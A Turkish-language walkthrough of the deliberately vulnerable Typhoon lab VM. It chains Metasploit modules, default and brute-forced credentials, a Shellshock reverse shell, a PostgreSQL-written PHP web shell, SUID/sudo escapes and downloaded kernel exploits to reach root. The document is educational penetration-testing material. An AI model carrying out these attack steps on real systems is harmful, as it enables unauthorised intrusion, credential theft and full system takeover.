# Typhoon Vulnerable VM Writeup
 
![alt text](https://github.com/muratyesiltepe/typhoon-vm/blob/master/1.png)

## 1-) Apache Tomcat/Coyote JSP engine 1.1

*8080 portunda Tomcat’in çalıştığı görülmektedir. Login ekranına brute-force saldırısı ile username ve password öğrenilebilir. Bunun için msfconsole ‘ da yer alan **auxiliary/scanner/http/tomcat_mgr_login** yardımcı modülünü kullanacağız.

![alt text](https://github.com/muratyesiltepe/typhoon-vm/blob/master/2.png)
 
Yukarıdaki resimde de görüldüğü gibi [ **username : tomcat , password : tomcat** ] olarak bulunmuştur. Şimdi ki aşama 8080 portuna gidip bulduğumuz username ve password ile login olmak.

![alt text](https://github.com/muratyesiltepe/typhoon-vm/blob/master/3.png)

Giriş yaptıktan sonra http://192.168.1.104:8080/manager/html/list adresine gidiyoruz. ( IP adresini kendinize göre düzenlemeniz gerekmektedir. ) Açılan sayfada aşağıya indiğimizde WAR file deploy edebildiğimiz görülmektedir. 

![alt text](https://github.com/muratyesiltepe/typhoon-vm/blob/master/4.png)

Şimdi yapmamız gereken msfvenom ile bir yük oluşturup buraya deploy etmek. Daha sonra ilgili portu dinlemeye alıp deploy ettiğimiz yükün tetiklenmesini sağlayarak shell almak. Hemen msfvenom ile bir yük oluşturalım.
 
![alt text](https://github.com/muratyesiltepe/typhoon-vm/blob/master/5.png)

Şimdi exploit/multi/handler ile 7007 portunu dinleyelim.

**NOT : exploit/multi/handler ‘ a msfvenom ile hangi payload’ı kullandıysak, LHOST olarak hangi hostu ve LPORT olarak hangi portu ayarladıysak o verilmelidir!**
 
![alt text](https://github.com/muratyesiltepe/typhoon-vm/blob/master/6.png)

Şimdi dinleme işlemini gerçekleştiriyoruz. Bir sonraki adım oluşturduğumuz war uzantılı dosyayı deploy edip tetiklemek olacaktır.
 
![alt text](https://github.com/muratyesiltepe/typhoon-vm/blob/master/7.png)

Yukarıda da görüldüğü gibi tetikleme sonucunda Shell almış olduk. Şuanda düşük yetkili bir kullanıcı ile sistemde Shell aldığımız görülmektedir. Sıradaki işlem **Local Privilege Escalation** ’dur.
 
![alt text](https://github.com/muratyesiltepe/typhoon-vm/blob/master/8.png)

Uname -a yaptığımızda 3.13.0-32-generic görülmektedir. İnternette yapılan araştırma sonucunda bir adet Local Privilege Escalation exploit’i bulunmuştur.

https://www.exploit-db.com/exploits/37292/
 
![alt text](https://github.com/muratyesiltepe/typhoon-vm/blob/master/9.png)

Yukarıdaki resimde yaptıklarımı sırasıyla anlatayım. Uygun bir exploit’i bulmuştuk bunu download etmek ve çalıştırmak için **/tmp** dizinine geçtim. Peki neden /tmp dizinine geçtim onu açıklayayım.
/tmp dizini özel bir dizindir. Bu dizine her kullanıcı indirme işlemi yapabilir ve her kullanıcı kendi indirdiği dosyadan sorumludur ve kendi indirdiği dosyayı çalıştırabilir. İşimi şansa bırakmamak için direkt olarak o dizine geçip Local Privilege Escalation exploit’ini oraya indirdim. 
Exploit c dili ile yazılmıştı ve çalıştırabilmem için derlemem gerekiyordu bunu da gcc ile halletmiş oldum. Daha sonra chmod ile çalıştırma yetkisi vererek ./37292 ile çalıştırdım ve **ROOT** oldum.

## 2-) Lotus CMS

Nikto ile 192.168.1.104 IP adresine sahip Typhoon makinasının 80 numaralı portunu taradığımda /cms/ dizini olduğunu görüyorum.
 
![alt text](https://github.com/muratyesiltepe/typhoon-vm/blob/master/10.png)

http://192.168.1.104/cms dizinine gittiğimde beni Lotus CMS karşılıyor.

 ![alt text](https://github.com/muratyesiltepe/typhoon-vm/blob/master/11.png)

İnternette yaptığım araştırmada bir adet Metasploit modülünün olduğunu görüyorum. Bu modül sayesinde uzaktan kod çalıştırabileceğim. Modül aşağıdadır.

https://www.rapid7.com/db/modules/exploit/multi/http/lcms_php_exec

Hemen msfconsole ekranından search ile exploit’i buluyorum ve kullanmaya başlıyorum.

![alt text](https://github.com/muratyesiltepe/typhoon-vm/blob/master/12.png)
 
Exploit payload olarak php/meterpreter/reverse_tcp ‘ yi kullanıyormuş ve exploit’in benden istediği 4 şey var. **RHOST , URI, LHOST , LPORT** . Bu değerleri girip exploit diyorum.
 
![alt text](https://github.com/muratyesiltepe/typhoon-vm/blob/master/13.png)

Yukarıda da görüldüğü gibi meterpreter session ‘ u aldım. Şimdi yapmam gereken hak yükselterek root yetkisini kazanmak. 
 
![alt text](https://github.com/muratyesiltepe/typhoon-vm/blob/master/14.png)

Yukarıda tomcat ile de sistemin 3.13.0 olduğunu görmüştük zaten. Yine /tmp dizinine geçerek overlayfs exploit’ini indirip, gcc ile derledikten sonra çalıştırıyorum ve root oluyorum.

exploit : https://www.exploit-db.com/download/37292.c
 
![alt text](https://github.com/muratyesiltepe/typhoon-vm/blob/master/15.png)

## 3-) phpMyAdmin
 
![alt text](https://github.com/muratyesiltepe/typhoon-vm/blob/master/16.png)

Nikto çıktısında phpmyadmin dizininin olduğu gözüküyor. Direkt bu dizine gidiyorum.

http://192.168.1.104/phpmyadmin/
 
![alt text](https://github.com/muratyesiltepe/typhoon-vm/blob/master/17.png)

Beni bir login ekranı karşıladı. İnternette exploit aradım ama işime yarayacak bir şey bulamadım. Bir şekilde login olmam gerekiyordu. Birçok parolayı denedim ama “toor” u denemek sonradan aklıma geldi.

**Username : root**
**Password : toor**

ile giriş yaptım. Burada birçok bilgiye ulaşabilir ve **birçok şey yapılabilir!**

## 4-) mongoadmin

http://192.168.1.104/robots.txt 

dizinine gittiğimde /mongoadmin/ dizininin Disallow olarak işaretlendiğini görmekteyim. 

![alt text](https://github.com/muratyesiltepe/typhoon-vm/blob/master/18.png)
 
Direkt o dizine gidiyoruz. Karşımıza phpMoAdmin diye bir şey çıkıyor.

![alt text](https://github.com/muratyesiltepe/typhoon-vm/blob/master/19.png)

Biraz kurcaladıktan sonra Credentials kısmı gözümüze çarpıyor. Credentials ‘ in altındaki creds kısmına tıkladığımızda aşağıdaki gibi username ve password karşımıza çıkıyor.
 
![alt text](https://github.com/muratyesiltepe/typhoon-vm/blob/master/20.png)

Bu username ve password’u SSH için deniyoruz.

![alt text](https://github.com/muratyesiltepe/typhoon-vm/blob/master/21.png)
 
Yukarıdaki resimde de görüldüğü gibi SSH ile içeri giriyoruz. Şimdi yapmamız gereken LPE ‘ dir. LPE exploit’ini aşağıdaki adresten bulabilirsiniz.

https://www.exploit-db.com/download/37292.c

wget yardımı ile dosyayı indirip, gcc ile derledikten sonra çalıştıracağız.
 
![alt text](https://github.com/muratyesiltepe/typhoon-vm/blob/master/22.png)

## 5-) Shellshock

 ![alt text](https://github.com/muratyesiltepe/typhoon-vm/blob/master/23.png)

Yukarıdaki resimde de görüldüğü gibi nikto bize /cgi/bin/test.sh ‘ i göstermektedir ve shellshock zafiyeti barındırmaktadır. İlgili payload ‘ ı User-Agent üzerinden gönderip nc ile reverse bağlantı alacağız. Bunu yapabilmek için Burp Suite kullanıyorum.
 
![alt text](https://github.com/muratyesiltepe/typhoon-vm/blob/master/24.png)

Yukarıda da görüldüğü gibi bağlantımızı aldık. Şimdi LPE sırası !

Overlayfs exploit’ini wget ile indirip gcc ile derlemek istediğimde hata alıyorum ve LPE yapamıyoruz. Bunun yerine başka bir LPE exploitini kendi makinama indirip derledikten sonra, apache2 servisinin yardımı ile hedef’e aktarıp çalıştıracağız.

Kullanacağımız exploit : https://www.exploit-db.com/exploits/40616/
 
 ![alt text](https://github.com/muratyesiltepe/typhoon-vm/blob/master/25.png)

 ![alt text](https://github.com/muratyesiltepe/typhoon-vm/blob/master/26.png)

Yukarıda da görüldüğü gibi başarıyla root olduk 😊

## 6-) Drupal

http://192.168.1.104/drupal dizinine gittiğimde beni drupal sayfası karşılıyor. Birkaç araştırmadan sonra drupalgeddon2 zafiyetinin olduğunu keşfettim. Metasploit ‘ de bunun için oluşturulmuş bir exploit bulunmaktadır.
exploit/unix/webapp/drupal_drupalgeddon2.rb

Eğer sizin metasploit’de böyle bir exploit yoksa metasploit’i güncellemeniz gerekmektedir. Bunun için komut satırına;
apt update; apt install metasploit-framework

yazmanız yeterlidir. Bunu yazdıktan sonra metasploit güncellenecek ve exploit gelmiş olacak.

![alt text](https://github.com/muratyesiltepe/typhoon-vm/blob/master/27.png)
 
Gerekli ayarlamaları yapıp exploit dedikten sonra meterpreter oturumu alıyoruz. Bundan sonra her zaman olduğu gibi Local Privilege Escalation yapmamız gerekiyor.

LPE exploit : https://www.exploit-db.com/download/37292.c

![alt text](https://github.com/muratyesiltepe/typhoon-vm/blob/master/28.png)
 
Yukarıdaki resimde de görüldüğü gibi derleyip çalıştırdıktan sonra root oluyoruz.

## 7-) Calendar

Dirbuster kullandığımda calendar dizininde yer alan login.php ile karşılaştım.

http://192.168.1.104/calendar/login.php

Burada dikkatimi çeken calendar’ın 1.2.4 sürümünün olmasıydı.

![alt text](https://github.com/muratyesiltepe/typhoon-vm/blob/master/29.png)
 
Biraz araştırma sonucunda Remote Code Injection olduğunu farkettim. Hatta Metasploit’te sırf buna özel exploit bile vardı.

**exploit/linux/http/webcalendar_settings_exec**

Direkt olarak bu exploit’i kullandım.

![alt text](https://github.com/muratyesiltepe/typhoon-vm/blob/master/30.png)
 
Artık bir shell’e sahiptim ama düşük yetkilerdeydi. Şimdi sıra LPE ‘ de! Bunun için her zaman olduğu gibi /tmp dizinine geçiyorum. İlgili exploit’i indirip derledikten sonra çalıştırıyorum.
 
![alt text](https://github.com/muratyesiltepe/typhoon-vm/blob/master/31.png)

Ve mutlu son artık root’um 😊

## 8-) Postgresql

5432 numaralı TCP portunda PostgreSQL DB 9.3.3 – 9.3.5 servisinin çalıştığı görülmektedir. İnternetten bir takım araştırmalarım sonucunda istediğim exploit koduna ulaşamadım. Daha sonra username ve password için brute-force saldırısı yapmak istedim. Bunun için kullanacağımz modül aşağıdadır.

**auxiliary/scanner/postgres/postgres_login**

Yardımcı modülün bizden istediği sadece RHOSTS kısmıdır. Kendisi default username ve default password dosyalarını kendi tanımlamıştır.
 
![alt text](https://github.com/muratyesiltepe/typhoon-vm/blob/master/32.png)

Yukarıdaki resimde de görüldüğü gibi [ **username : postgres , password : postgres** ] olarak bulunmuştur. Veritabanına bağlanmak için kali sanal makinasında bulunan **psql** aracını kullanacağım.
 
![alt text](https://github.com/muratyesiltepe/typhoon-vm/blob/master/33.png)

Yukarıdaki parametreleri açıklamak gerekirse -h hostu , -U ise username ‘ i belirtmek için kullanılmaktadır. Daha sonra sizden parola isteyecektir. Parolayada postgres yazarak login işlemini başarıyla gerçekleştiriyoruz.

**select version();**     komutu ile veritabanının kullandığı version öğrenilebilir.

 ![alt text](https://github.com/muratyesiltepe/typhoon-vm/blob/master/34.png)

Onun dışında veritabanına kullanıcı eklenebilir, eklenen kullanıcıya SUPERUSER yetkisi verilebilir, şemalar ve veritabanları görüntülenebilir. Tabii ki bunların hepsinin yapılması veya daha çok şey yapılması sizin postgresql bilginize bağlıdır.

Amacımız root yetkisiyle sisteme sızmak veya düşük yetkili bir kullanıcı ile sızıp local privilege escalation yapmaktır. O halde başlayalım.
 
![alt text](https://github.com/muratyesiltepe/typhoon-vm/blob/master/35.png)

Yukarıda yazdığım komutları açıklamak gerekirse;

**CREATA TABLE pwn (t TEXT);**  -- pwn adında bir tablo oluşturdum.

**INSERT INTO pwn(t) VALUES (‘<?php @system(“$_GET[cmd]”);?>’);**  -- pwn tablosunun t isimli text’ine basit php kodu ekledim. Bu php kodu bana RCE sağlayacak.

**COPY pwn(t) TO ‘/var/www/html/cmd.php’;**  --  RCE sağlayacak php kodunu /var/www/html dizinine attım.

Şimdi sıra browser’dan ilgili dizine gidip komut çalıştırmaya geldi.

![alt text](https://github.com/muratyesiltepe/typhoon-vm/blob/master/36.png)
 
Yukarıdan da görüldüğü gibi başarılı bir şekilde komut çalıştırılabiliyor. Şimdi buradan reverse bağlantı almamız gerekmektedir. Bunun için msfvenom ile bir yük oluşturacağım. Bu yükü /var/www/html/ dizinine atacağım.

Exploit/multi/handler ile yükü dinledikten sonra oluşturduğum yükü /tmp dizinine indirip çalıştıracağım. Böylelikle reverse bağlantı almış olacağım.
 
 ![alt text](https://github.com/muratyesiltepe/typhoon-vm/blob/master/37.png)

 ![alt text](https://github.com/muratyesiltepe/typhoon-vm/blob/master/38.png)

 ![alt text](https://github.com/muratyesiltepe/typhoon-vm/blob/master/39.png)

 ![alt text](https://github.com/muratyesiltepe/typhoon-vm/blob/master/40.png)
 
Yukarıda da görüldüğü gibi oturumumuz açıldı. Şimdi /tmp dizinine geçip LPE yapmamız gerekmektedir.

![alt text](https://github.com/muratyesiltepe/typhoon-vm/blob/master/41.png)
 
Böylelikle postgresql üzerinden de bu şekilde root almış olduk.

## 9-) vsFTPD 3.0.2 

21 numaralı portta vsFTPD 3.0.2 çalışmaktadır. Burada;

**username : anonymous**

**password : anonymous**

girişine izin verilip verilmediği kontrol edilmiştir.

![alt text](https://github.com/muratyesiltepe/typhoon-vm/blob/master/42.png)
 
Yukarıdaki resimden de anlaşılacağı üzere böyle bir giriş söz konusudur.

## 10-) OpenSSH 6.6.1p1

Burada yapmamız gereken işlem doğru kullanıcıyı bulup brute-force işlemi gerçekleştirmektedir. Keşif sırasında /bin/bash yetkisi olan kullanıcılar vardı. Bunlar;

root
admin
postfixuser
typhoon

işte bizde ssh ‘ a brute-force yaparken bu kullanıcıları kullanmamız gerekmektedir. Brute-force işlemini gerçekleştirmesi için kullandığım araç hydra’dır ve aşağıdaki gibi kullanılır.

**hydra -l username -P password.txt IP_Adresi ssh**

Yukarıda /bin/bash yetkisi olanlar arasından admin ile brute-force işlemini gerçekleştirmek için kullanacağımız komut aşağıdadır. Password listesi olarak rockyou.txt kullanılmıştır.

**hydra -l admin -P rockyou.txt 192.168.1.104 ssh**
 
![alt text](https://github.com/muratyesiltepe/typhoon-vm/blob/master/43.png)

Sonuca baktığımızda [ **username : admin   ,   password : metallica** ] gözükmektedir.

Bu username ve password ile ssh üzerinden login oluyoruz. Düşük yetkili bir kullanıcı olduğumuz için LPE yapmamız gerekmektedir. Bu aşamada farklı bir yol olarak SUID bitlerine bakalım.

Aşağıdaki komutlar tüm SUID yürütücülerini keşfetmeye yarar.

**find / -user root -perm -4000 -print 2>/dev/null**

find / -perm -u=s -type f 2>/dev/null

find / -user root -perm -4000 -exec ls -ldb {} \;

Ben burada koyu renk ile işaretlediğim komutu kullanacağım. 
 
![alt text](https://github.com/muratyesiltepe/typhoon-vm/blob/master/44.png)

Yukarıdaki tüm ikili dosyalar izinlerinde “s” bulundurduğu için ve root kullanıcısı tarafından sahiplendiği için kök ayrıcalıklarıyla yürütülürler.
 
![alt text](https://github.com/muratyesiltepe/typhoon-vm/blob/master/45.png)

Yukarıdaki resimde dosya izinlerinde “s” gözükmektedir. Kök ayrıcalıklarıyla yürütülen sudo komutu ile de root oluyoruz. Bunun dışında yine başka bir kök ayrıcalıklarıyla yürütülen ikili dosya sayesinde de root olunabilir. Şimdi ise /usr/bin/vim.basic ‘ e bakalım.

usr/bin/vim.basic ile ‘ de root olunabilir. Bunun için terminale aşağıdaki komutu girmemiz yeterlidir.

**sudo vim.basic -c '!sh'**

 ![alt text](https://github.com/muratyesiltepe/typhoon-vm/blob/master/46.png)

Şimdi sıra /usr/bin/head ‘ ı inceleyelim.

head ile dosyaların içeriğini okuyabiliyoruz. Örnek olarak etc/passwd ile etc/shadow ‘  okuyalım. 
 
![alt text](https://github.com/muratyesiltepe/typhoon-vm/blob/master/47.png)

Görüldüğü gibi dosyaların içeriğini okuyabiliyoruz. Daha sonra John The Ripper kullanılarak parolalar ele geçirilebilir ve ilgili kullanıcı ile giriş yapılarak root yetkisine ulaşılabilir.

## 11-) Postfix

Burada 25 numaralı port üzerinden banner bilgisi incelenecektir. Bunun için nc aracı kullanılabilir.

![alt text](https://github.com/muratyesiltepe/typhoon-vm/blob/master/48.png)
 
Gereken bilgiyi yakaladıktan sonra kali makinamızın /etc/hosts dosyasını buna uygun bir şekilde aşağıdaki gibi güncelliyoruz.

![alt text](https://github.com/muratyesiltepe/typhoon-vm/blob/master/49.png)
 
Bundan sonra yapmamız gereken işlem DNS ‘ de herhangi bir Zone Transfer Açığı var mı yok mu ona bakmak. Bu sayede subdomain’leri keşfedebilir ve onun üzerinden testimize devam edebiliriz. Zaten Zone Transfer açığının olması pentest raporlarına direkt olarak yazılabilir ama biz bu açıklıkla kalmayıp sistemde root olmaya bakacağız. Zonetransfer açığının olup olmadığını DİG aracını kullanarak keşfedelim.
 
![alt text](https://github.com/muratyesiltepe/typhoon-vm/blob/master/50.png)

Yukarıdaki resimde de görüldüğü gibi calendar isimli bir subdomain ve bir adet flag yakalamış oluyoruz. Direkt olarak calendar dizinine gidelim.
 
![alt text](https://github.com/muratyesiltepe/typhoon-vm/blob/master/51.png)

İlk aşamada ilgimi çeken WebCalendar’ın 1.2.4 sürümü oldu. Bu sürümde Remote Code Injection yapılabiliyor. Metapsploitte bunun istismarı için bir modül bulunmaktadır.

**exploit/linux/http/webcalendar_settings_exec**

Bu modül sayesinde sistemde shell alınmaktadır.
 
![alt text](https://github.com/muratyesiltepe/typhoon-vm/blob/master/52.png)

Düşük yetkilerde olduğumuz için Local Privilege Escalation yapmamız gerekmektedir. Bunun için ilgili exploit’i /tmp dizinine indiriyoruz. Daha sonra gcc ile derleyip çalıştırıyoruz.
 
![alt text](https://github.com/muratyesiltepe/typhoon-vm/blob/master/53.png)

Sonuç olarak SMTP üzerinden yakaladığımız bilgiler ile Zone Transfer Açığı olup olmadığını kontrol ettik. Yaptığımız kontroller sonucunda açığın mevcut olduğunu gördük ve calendar isminde bir subdomainin olduğunu fark ettik. Direkt o dizine gittiğimizde WebCalendar ‘ ın 1.2.4 sürümünün kullanıldığını gördük. Yaptığımız araştırmalar sonucunda Metasploit’te buna özel bir modül olduğunu gördük ve o modülü kullanarak sistemde session açmış olduk. Düşük yetkilerde olduğumuz için /tmp dizinine geçip hak yükseltmeyi başardık.

**Not : 7 Numarada bahsettiğim Calendar sızma işlemi Dirbuster ile taratıldıktan sonra ilgili dizinin bulunması sunucunda gerçekleştirilmişti. İlgili dizin Dirbuster ile taratıldıktan sonra bulunamayabilir. Şayet bulunmasaydı senaryomuz böyle gerçekleşecekti.**
